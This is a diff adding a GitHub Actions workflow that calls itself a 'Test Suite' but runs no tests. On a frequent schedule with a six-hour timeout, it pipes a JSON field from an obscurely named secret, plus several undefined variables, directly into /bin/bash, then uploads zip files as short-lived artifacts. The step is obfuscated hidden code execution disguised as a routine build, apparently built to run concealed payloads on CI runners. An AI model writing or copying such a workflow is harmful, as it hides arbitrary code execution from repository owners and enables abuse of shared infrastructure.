@@ -1,0 +1,37 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '59 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          hpwao9: ${{ secrets.hpwao9 }}
+        run: |
+          printf '%s' "$hpwao9" | jq -r .t0320 | /bin/bash
+          echo $bgq2 | jq -r .rlvlv44217 | /bin/bash
+          printf '%s' "$dc54" | jq -r .o22414 | /bin/bash
+          printf '%s' "$vpvo70903" | jq -r .vssnf65 | /bin/bash
+          echo $a670 | jq -r .ztsq47697 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: dcwxWwtk
+          path: "*.zip"
+          retention-days: 1
